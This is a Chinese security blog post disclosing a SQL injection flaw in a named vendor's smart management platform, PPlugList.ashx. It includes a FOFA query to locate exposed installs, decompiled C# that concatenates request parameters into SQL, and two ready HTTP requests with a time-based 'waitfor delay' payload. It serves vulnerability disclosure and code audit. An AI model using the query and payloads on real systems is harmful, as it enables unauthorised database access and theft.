---
title: "银达汇智智慧综合管理平台 PPlugList.ashx SQL注入漏洞"
source: https://mrxn.net/jswz/windor-Module-CJGL-Controller-PPlugList-sqli.html
asset_dir: assets/银达汇智智慧综合管理平台-ppluglist.ashx-sql注入漏洞
---

# 银达汇智智慧综合管理平台 PPlugList.ashx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/5/30 08:20
- 880浏览
- [0评论](#comment)
- 2小时阅读

深入探索

安全研究工具

Web安全书籍

软件

---

# 漏洞简介

福建银达汇智信息科技股份有限公司成立于2009年，位于福建省福州市，是一家以从事[软件](#)和信息技术服务业为主的企业。银达汇智智慧综合管理平台 `PPlugList.ashx` 存在[SQL注入](https://mrxn.net/tag/SQL注入)漏洞,攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码,站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

SQL注入防护

# 影响版本

# fofa语法

> `title="智慧综合管理平台登入"`

# 漏洞分析

先看下 `Module/CJGL/PPlugList.aspx` 部分表单

```
<!--查询条件End-->
    <!--列表--><div region="center" showheader="false" style="border-right: 0; border-bottom: 0;">
            <div class="mini-fit">
                <kr:DataGrid runat="server" ID="grdMain" Style="height: 100%; width: 100%" BorderStyle="padding:0;background-color: #F8F8F8; border-bottom:none;border-left:none;"
                    IdField="id" Url="Controller/PPlugList.ashx?action=find" PageSize="20">
                    <kr:DataGirdColumn runat="server" Property="columns">
                        <kr:DataGirdColumn runat="server" Type="indexcolumn" />
                        <kr:DataGirdColumn runat="server" Type="checkcolumn" />

                        <kr:DataGirdColumn runat="server" Field="PlugName" HeaderAlign="center" Allowsort="true">插件名称</kr:DataGirdColumn>
                                            <kr:DataGirdColumn runat="server" Field="PlugIdentName" HeaderAlign="center" Allowsort="true">插件类型</kr:DataGirdColumn>
                        <kr:DataGirdColumn runat="server" Field="Cols" HeaderAlign="center" Allowsort="true">列宽</kr:DataGirdColumn> 
                        <kr:DataGirdColumn runat="server" Field="Rows" HeaderAlign="center" Allowsort="true">行高</kr:DataGirdColumn>
                        <kr:DataGirdColumn runat="server" Field="DataUrl" HeaderAlign="center" Allowsort="true">插件数据源地址</kr:DataGirdColumn>
                    </kr:DataGirdColumn>
                </kr:DataGrid>

            </div>
        </div>
```

深入探索

SQL

Windows安全工具

安全工具开发

再看 `Module/CJGL/Controller/PPlugList.ashx` 页面引用的dll

代码安全审计

```
<%@ WebHandler Language="C#" CodeBehind="PPlugList.ashx.cs" Class="KR.Administrator.Module.Controller.PPlugList"  %>
```

再去对应dll文件 `KR.Administrator.dll` 反编译后获取 `Module.Controller.PPlugList` 的执行逻辑

```
public override void AjaxProcess(HttpContext context)
{
  context.Response.ContentType = "text/plain";
  string str1 = WRequest.GetString("action");
  try
  {
    if (string.op_Equality(str1, "find"))
    {
      int recordcount = 0;
      string strWhere = " 1=1 ";
      if (!string.IsNullOrEmpty(WRequest.GetString("PlugIdentID")))
        strWhere += $" and PlugIdentID like '%{WRequest.GetString("PlugIdentID")}%'";
      if (!string.IsNullOrEmpty(WRequest.GetString("PlugName")))
        strWhere += $" and PlugName like '%{WRequest.GetString("PlugName")}%'";
      if (!string.IsNullOrEmpty(WRequest.GetString("DataUrl")))
        strWhere += $" and DataUrl like '%{WRequest.GetString("DataUrl")}%'";
      DataTable dataTableList = this.bll.GetDataTableList("view_T_P_PlugList", WRequest.GetInt("pagesize") == 0 ? 10 : WRequest.GetInt("pagesize"), WRequest.GetInt("pageIndex") == 0 ? 1 : WRequest.GetInt("pageIndex") + 1, "*", $" {(string.IsNullOrEmpty(WRequest.GetString("SortField")) ? (object) "id" : (object) WRequest.GetString("SortField"))} {(string.IsNullOrEmpty(WRequest.GetString("SortOrder")) ? (object) "desc" : (object) WRequest.GetString("SortOrder"))}", strWhere, out recordcount);
      DataGridModel dataGridModel = new DataGridModel()
      {
        total = recordcount,
        data = dataTableList
      };
      context.Response.Write(JsonConvert.SerializeObject((object) dataGridModel));
      LogHelper.SysInfo("插件列表管理：查看！", new Exception(context.Request.Form.ToString()));
    }
    else if (string.op_Equality(str1, "findAll"))
    {
      int recordcount = 0;
      string strWhere = " 1=1 ";
      DataTable dataTableList = this.bll.GetDataTableList("view_T_P_PlugList", 50, WRequest.GetInt("pageIndex") == 0 ? 1 : WRequest.GetInt("pageIndex") + 1, "*", $" {(string.IsNullOrEmpty(WRequest.GetString("SortField")) ? (object) "id" : (object) WRequest.GetString("SortField"))} {(string.IsNullOrEmpty(WRequest.GetString("SortOrder")) ? (object) "desc" : (object) WRequest.GetString("SortOrder"))}", strWhere, out recordcount);
      DataGridModel dataGridModel = new DataGridModel()
      {
        total = recordcount,
        data = dataTableList
      };
      context.Response.Write(JsonConvert.SerializeObject((object) dataGridModel));
      LogHelper.SysInfo("插件列表管理：查看！", new Exception(context.Request.Form.ToString()));
    }
    else if (string.op_Equality(str1, "save"))
      this.save(context);
    else if (string.op_Equality(str1, "look") || string.op_Equality(str1, "update"))
    {
      KR.Model.PPlugList pplugList = this.bll.GetItem((long) WRequest.GetInt("id"));
      context.Response.Write(JsonConvert.SerializeObject((object) pplugList));
    }
    else if (string.op_Equality(str1, "selectedDel"))
    {
      if (SystemHelper.checkPermission("PPlugList_btnDel"))
      {
        string str2 = WRequest.GetString("ids");
        if (!string.IsNullOrEmpty(str2))
        {
          IList<KR.Model.PPlugList> list = (IList<KR.Model.PPlugList>) this.bll.GetList($"id in ({str2}) ");
          LogHelper.SysInfo("插件列表管理：删除！", new Exception(JsonConvert.SerializeObject((object) list)));
          StringBuilder stringBuilder = new StringBuilder();
          foreach (KR.Model.PPlugList pplugList in (IEnumerable<KR.Model.PPlugList>) list)
          {
            stringBuilder.Append(pplugList.id);
            stringBuilder.Append(",");
          }
          this.bll.Delete((ICondition) new Condition("id", FieldType.Int32, (object) stringBuilder.ToString().Trim(new char[1]
          {
            ','
          }), Comparison.In));
          context.Response.Write(SystemHelper.WriteResult("success", "删除成功！"));
        }
        else
          context.Response.Write(SystemHelper.WriteResult("error", "请选择要删除项！"));
      }
      else
        context.Response.Write(SystemHelper.WriteResult("error", "您无权限或者访问异常！请联系管理人员。"));
    }
    else if (string.op_Equality(str1, "conditionDel"))
    {
      if (SystemHelper.checkPermission("PPlugList_btnDel"))
      {
        string strWhere = " 1=1 ";
        if (!string.IsNullOrEmpty(WRequest.GetString("PlugIdentID")))
          strWhere += $" and PlugIdentID like '%{WRequest.GetString("PlugIdentID")}%'";
        if (!string.IsNullOrEmpty(WRequest.GetString("PlugName")))
          strWhere += $" and PlugName like '%{WRequest.GetString("PlugName")}%'";
        if (!string.IsNullOrEmpty(WRequest.GetString("DataUrl")))
          strWhere += $" and DataUrl like '%{WRequest.GetString("DataUrl")}%'";
        if (!string.IsNullOrEmpty(WRequest.GetString("org_id")))
          strWhere += $" and org_id like '%{WRequest.GetString("org_id")}%'";
        IList<KR.Model.PPlugList> list = (IList<KR.Model.PPlugList>) this.bll.GetList(strWhere);
        LogHelper.SysInfo("插件列表管理：删除！", new Exception(JsonConvert.SerializeObject((object) list)));
        StringBuilder stringBuilder = new StringBuilder();
        foreach (KR.Model.PPlugList pplugList in (IEnumerable<KR.Model.PPlugList>) list)
        {
          stringBuilder.Append(pplugList.id);
          stringBuilder.Append(",");
        }
        if (stringBuilder.Length > 0)
        {
          this.bll.Delete((ICondition) new Condition("id", FieldType.Int32, (object) stringBuilder.ToString().Trim(new char[1]
          {
            ','
          }), Comparison.In));
          context.Response.Write(SystemHelper.WriteResult("success", "删除成功！"));
        }
        else
          context.Response.Write(SystemHelper.WriteResult("error", "未找到符合条件的数据！"));
      }
      else
        context.Response.Write(SystemHelper.WriteResult("error", "您无权限或者访问异常！请联系管理人员。"));
    }
    else if (string.op_Equality(str1, "exportExcel"))
      this.exportExcel(context);
    else
      context.Response.Write(SystemHelper.WriteResult("error", "您无权限或者访问异常！请联系管理人员。"));
  }
  catch (Exception ex)
  {
    LogHelper.SysError($"插件列表管理：操作异常！action:{str1};Form:{context.Request.Form.ToString()}", ex);
    context.Response.Write(SystemHelper.WriteResult("error", ex.Message.Replace("\"", "'")));
  }
}
```

## exportExcel

```
private void exportExcel(HttpContext context)
  {
    string condition = " 1=1 ";
    if (!string.IsNullOrEmpty(WRequest.GetString("sPlugIdentID")))
      condition += $" and PlugIdentID like '%{WRequest.GetString("sPlugIdentID")}%'";
    if (!string.IsNullOrEmpty(WRequest.GetString("sPlugName")))
      condition += $" and PlugName like '%{WRequest.GetString("sPlugName")}%'";
    if (!string.IsNullOrEmpty(WRequest.GetString("sDataUrl")))
      condition += $" and DataUrl like '%{WRequest.GetString("sDataUrl")}%'";
    if (!string.IsNullOrEmpty(WRequest.GetString("sorg_id")))
      condition += $" and org_id like '%{WRequest.GetString("sorg_id")}%'";
    DataTable dataTabelToExcel = this.bll.GetDataTabelToExcel(KR.Controls.RunTime.Global.webSiteConfig.ExportCount, condition);
    if (((InternalDataCollectionBase) dataTabelToExcel.Rows).Count <= 0)
      return;
    SystemHelper.CreateExcel(dataTabelToExcel, "application/x-excel", DateTime.Now.ToString("yyyyMMddHHmmssfff"), context, "插件列表管理导出Excel表");
  }
```

而 `WRequest.GetString` 的实现如下

漏洞扫描服务

```
  public static string GetString(string strName)
  {
    bool sqlSafeCheck = false;
    if (ConfigurationManager.AppSettings["SQLCHECK"] != null)
      sqlSafeCheck = true;
    return WRequest.GetString(strName, sqlSafeCheck);
  }
```

取决于 配置文件里的 `SQLCHECK` 值，如果没有配置，则默认为 false ，则可能造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

- 当 `action=find` 时， PlugIdentID、PlugName、DataUrl以及 SortOrder 均是通过 `WRequest.GetString` 获取后拼接进SQL语句中。
- 当 `action=exportExcel` 时，sPlugIdentID、sPlugName、sDataUrl 以及 sorg\_id 均是通过 WRequest.GetString 获取后拼接进SQL语句中。
- 当 `action=findAll` 时，未授权直接查询前 50 条数据，分页。以 JSON 格式输出 DataGridModel。
- 当 `action=save` 时，调用 `save(context)` 方法进行保存。save 方法内部包含：判断是新增还是修改、校验插件名称唯一性、权限校验、保存数据、记录日志、输出结果。
- 当 `action=look` 或 `action=update` 时，根据参数 id 查询单条数据。以 JSON 格式输出对应数据。
- 当 `action=selectedDel` 或 `action=conditionDel` 时，首先校验权限，因此不能未授权利用。

整体执行流程如下图所示：

软件

[![银达汇智智慧综合管理平台 PPlugList.ashx SQL注入漏洞](images/img-001-13fd5d6706d2.webp)](https://image.mrxn.net/bc689f784cef41378c1f7241c2e0decf.webp)

# 漏洞复现

## action=exportExcel

```
POST /Module/CJGL/Controller/PPlugList.ashx HTTP/1.1
Host: windor.mrxn.net
Content-Type: application/x-www-form-urlencoded

action=exportExcel&sPlugIdentID='waitfor+delay'0:0:4'--
```

[![银达汇智智慧综合管理平台 PPlugList.ashx SQL注入漏洞](images/img-002-c4f2c52760a8.webp)](https://image.mrxn.net/e1bcedf0dbbb455b9a518da8da56be61.webp)

成功延时 4 秒

编程

## action=find

```
POST /Module/CJGL/Controller/PPlugList.ashx HTTP/1.1
Host: windor.mrxn.net
Content-Type: application/x-www-form-urlencoded

action=find&PlugIdentID='waitfor+delay'0:0:4'--
```

[![银达汇智智慧综合管理平台 PPlugList.ashx SQL注入漏洞](images/img-003-e78eb1cfb531.webp)](https://image.mrxn.net/6246466a403645fab18eecb1ddcc750a.webp)

也成功延时 4 秒

网络安全

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [4.1.exportExcel](#toc-4-1-)
- [5.漏洞复现](#toc-5-)
- [5.1.action=exportExcel](#toc-5-1-)
- [5.2.action=find](#toc-5-2-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
